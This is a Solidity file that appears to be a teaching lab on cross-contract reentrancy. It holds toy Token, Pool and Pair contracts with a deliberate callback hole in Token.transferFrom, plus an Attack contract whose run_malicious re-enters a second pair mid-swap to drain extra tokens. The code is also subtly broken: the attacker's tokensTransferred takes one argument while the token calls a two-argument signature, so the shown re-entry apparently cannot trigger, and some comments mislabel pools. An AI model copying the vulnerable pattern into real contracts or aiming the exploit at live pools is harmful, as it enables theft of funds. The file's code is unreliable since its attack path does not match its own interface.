// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IReceiver {
    // function receiveTokens(address from, uint amount) external;
    function tokensTransferred(address to, uint256 amount) external;
}

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    bool public reentered; // = false

    event Transfer(address from, address to, uint256 amount);
    event LogBool(string s, bool x);

    modifier reentrancyGuard() {
        if (reentered) revert("You shall not enter");
        reentered = true;
        _;
        reentered = false;
    }

    constructor() {
        balanceOf[msg.sender] = 110e18;
    }

    function transfer(address to, uint256 amount) public {
        // Effects
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        // note: all these are equivalent (yes, I tested it in Remix).
        // bytes memory b = abi.encodeWithSelector(IReceiver.tokensTransferred.selector, msg.sender, amount);
        // bytes memory b = abi.encodeWithSignature("tokensTransferred(address,uint256)", msg.sender, amount);
        // bytes memory b = concat(
        //     abi.encodePacked(bytes4(IReceiver.tokensTransferred.selector)),
        //     abi.encode(msg.sender, amount)
        // );
        emit Transfer(msg.sender, to, amount / 1e18);
        // Interactions
        // bytes memory b = abi.encodeCall(IReceiver.tokensTransferred, (to, amount));
        // For external accounts `to`, this will silently succeed anyway
        // For contracts `to`, don't require that they implement `tokensTransferred` (and not throw).
        // (bool success,) = from.call(b);
    }

    function approve(address spender, uint256 amount) public {
        allowance[msg.sender][spender] = amount;
    }

    function transferFrom(address from, address to, uint256 amount) public {
        // Effects
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount / 1e18);
        // Interactions
        bytes memory b = abi.encodeCall(IReceiver.tokensTransferred, (to, amount));
        emit LogBool("Token.transferFrom: calling from", true);
        (bool success,) = from.call(b);
        emit LogBool("Token.transferFrom: after call, success", success);
    }

    function concat(bytes memory b1, bytes memory b2) public pure returns (bytes memory) {
        return abi.encodePacked(b1, b2);
    }
}

contract Pool {
    Token public token;
    address public d;

    modifier onlyD() {
        if (msg.sender != d) revert("You shall not enter");
        _;
    }

    constructor(Token _token) {
        token = _token;
        d = msg.sender;
    }

    function setMaxPossibleApproval(address pair) public onlyD {
        token.approve(pair, type(uint256).max);
    }
}

contract Pair {
    Pool public pool0;
    Pool public pool1;
    string public meme;
    bool public reentered; // = false

    event LogUint(string s, uint256 x);

    modifier reentrancyGuard() {
        if (reentered) revert("You shall not enter");
        reentered = true;
        _;
        reentered = false;
    }

    constructor(Pool _pool0, Pool _pool1) {
        pool0 = _pool0;
        pool1 = _pool1;
    }

    function swap(uint256 amountFromUser, bool token1ForUser) public reentrancyGuard {
        emit LogUint("Pair.swap called: amountFromUser", amountFromUser / 1e18);
        // Checks
        Pool pool_to_user = token1ForUser ? pool1 : pool0;
        Pool pool_from_user = token1ForUser ? pool0 : pool1;
        Token token_to_user = pool_to_user.token();
        Token token_from_user = pool_from_user.token();
        uint256 amount_to_user = getDeltaY(
            /*      x = */
            token_from_user.balanceOf(address(pool_from_user)),
            /*      y = */
            token_to_user.balanceOf(address(pool_to_user)),
            /* deltaX = */
            amountFromUser
        );
        // Interactions
        token_from_user.transferFrom(
            /*   from = */
            msg.sender,
            /*     to = */
            address(pool_from_user),
            /* amount = */
            amountFromUser
        );
        token_to_user.transferFrom(
            /*   from = */
            address(pool_to_user),
            /*     to = */
            msg.sender,
            /* amount = */
            amount_to_user
        );
        emit LogUint("Pair.swap exiting: amount_to_user", amount_to_user / 1e18);
    }

    /// We have:
    /// Δy = (-yΔx)/(x+Δx)
    /// For full derivation, see the attached equation.
    function getDeltaY(uint256 x, uint256 y, uint256 deltaX) public pure returns (uint256 deltaY) {
        uint256 num = y * deltaX;
        uint256 den = x + deltaX;
        deltaY = num / den;
    }
}

contract Deploy {
    Token public token0;
    Token public token1;
    Token public token2;
    Pool public pool0;
    Pool public pool1;
    Pool public pool2;
    Pair public pair01;
    Pair public pair12;

    constructor() {
        token0 = new Token();
        token1 = new Token();
        token2 = new Token();

        token0.transfer(msg.sender, 10e18);
        token1.transfer(msg.sender, 10e18);
        token2.transfer(msg.sender, 10e18);

        pool0 = new Pool(token0);
        pool1 = new Pool(token1);
        pool2 = new Pool(token2);

        token0.transfer(address(pool0), 100e18);
        token1.transfer(address(pool1), 100e18);
        token2.transfer(address(pool2), 100e18);

        pair01 = new Pair(pool0, pool1);
        pair12 = new Pair(pool1, pool2);

        pool0.setMaxPossibleApproval(address(pair01));
        pool1.setMaxPossibleApproval(address(pair01));
        pool1.setMaxPossibleApproval(address(pair12));
        pool2.setMaxPossibleApproval(address(pair12));
    }
}

contract Attack {
    Deploy public d;

    event LogUint(string s, uint256 x);
    event LogAddress(string s, address a);

    constructor() {
        d = new Deploy();
        // Each pool has 100 tokens, user (attacker) has 10 tokens of each
    }

    function run_benevolent() public {
        log_addresses_in_system();
        d.token0().approve(address(d.pair01()), 10e18);
        d.pair01().swap(
            /*        amount = */
            10e18,
            /* token1ForUser = */
            true
        );
        //      token0.balanceOf(this)  ==   0            (10 less)
        //      token0.balanceOf(pool0) == 110            (10 more)
        // 19 < token1.balanceOf(this)   <  20          (9.0̅9̅ more)
        // 90 < token1.balanceOf(pool1)  <  91          (9.0̅9̅ less)
        assert(d.token0().balanceOf(address(d.pool0())) == 110e18);
        assert(d.token0().balanceOf(address(this)) == 0);
        assert(d.token1().balanceOf(address(d.pool1())) > 90e18);
        assert(d.token1().balanceOf(address(d.pool1())) < 91e18);
        assert(d.token1().balanceOf(address(this)) > 19e18);
        assert(d.token1().balanceOf(address(this)) < 20e18);

        // -------------------------------------------------------

        d.token2().approve(address(d.pair12()), 10e18);
        d.pair12().swap(
            /*        amount = */
            10e18,
            /* token1ForUser = */
            false
        );

        //      token2.balanceOf(this)  ==   0            (10 less)
        //      token2.balanceOf(pool0) == 110            (10 more)
        // 27 < token1.balanceOf(this)   <  28          (8.26 more)
        // 82 < token1.balanceOf(pool1)  <  83          (8.26 less)
        assert(d.token2().balanceOf(address(d.pool2())) == 110e18);
        assert(d.token2().balanceOf(address(this)) == 0);
        assert(d.token1().balanceOf(address(d.pool1())) > 82e18);
        assert(d.token1().balanceOf(address(d.pool1())) < 83e18);
        assert(d.token1().balanceOf(address(this)) > 27e18);
        assert(d.token1().balanceOf(address(this)) < 28e18);
    }

    function run_malicious() public {
        log_addresses_in_system();
        d.token0().approve(address(d.pair01()), 10e18);
        d.pair01().swap(
            /*        amount = */
            10e18,
            /* token1ForUser = */
            true
        );
        // Re-entrancy occurs here

        //      token0.balanceOf(this)  ==   0            (10 less)
        //      token0.balanceOf(pool0) == 110            (10 more)
        //      token2.balanceOf(this)  ==   0            (10 less)
        //      token2.balanceOf(pool0) == 110            (10 more)
        // 28 < token1.balanceOf(this)   <  29          (18.1̅8̅ more)
        // 81 < token1.balanceOf(pool1)  <  82          (18.1̅8̅ less)
        assert(d.token0().balanceOf(address(d.pool0())) == 110e18);
        assert(d.token0().balanceOf(address(this)) == 0);
        assert(d.token2().balanceOf(address(d.pool2())) == 110e18);
        assert(d.token2().balanceOf(address(this)) == 0);
        assert(d.token1().balanceOf(address(d.pool1())) > 81e18);
        assert(d.token1().balanceOf(address(d.pool1())) < 82e18);
        assert(d.token1().balanceOf(address(this)) > 28e18);
        assert(d.token1().balanceOf(address(this)) < 29e18);
    }

    function log_addresses_in_system() public {
        emit LogAddress("attack", address(this));
        emit LogAddress("deploy", address(d));
        emit LogAddress("token0", address(d.token0()));
        emit LogAddress("token1", address(d.token1()));
        emit LogAddress("token2", address(d.token2()));
        emit LogAddress("pool0", address(d.pool0()));
        emit LogAddress("pool1", address(d.pool1()));
        emit LogAddress("pool2", address(d.pool2()));
        emit LogAddress("pair01", address(d.pair01()));
        emit LogAddress("pair12", address(d.pair12()));
    }

    // bool attacked;

    function tokensTransferred( /*address to,*/ uint256 amount) public {
        emit LogUint("tokensTransferred called: amount", amount / 1e18);
        // if (attacked) return;
        // attacked = true;
        d.token2().approve(address(d.pair12()), 10e18);
        d.pair12().swap(
            /*        amount = */
            10e18,
            /* token1ForUser = */
            false
        );
    }
}
